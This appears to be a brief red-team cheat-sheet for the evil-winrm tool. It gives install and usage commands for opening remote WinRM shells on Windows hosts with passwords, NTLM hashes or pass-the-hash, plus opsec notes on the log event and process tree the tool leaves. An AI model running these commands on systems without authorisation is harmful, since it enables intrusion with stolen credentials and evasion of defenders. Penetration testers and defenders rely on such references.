### Source
https://github.com/Hackplayers/evil-winrm  

### Install
```
gem install evil-winrm
```

### Start shell on host (port 5985,5986)
```
evil-winrm -i <ip> -u <user> -p <password>
```

### Using ntlm hash
```
evil-winrm -i <ip> -u <user> -H <ntlmHash>
```

### Pass the hash
```
evil-winrm -u <user> -H <Hash> -i <IP>
```

### Opsec considerations
```
-WMI/Operational (5857)
```

### Running processes
```
wsmprovhost.exe
└── sc.exe
    └── conhost.exe
```

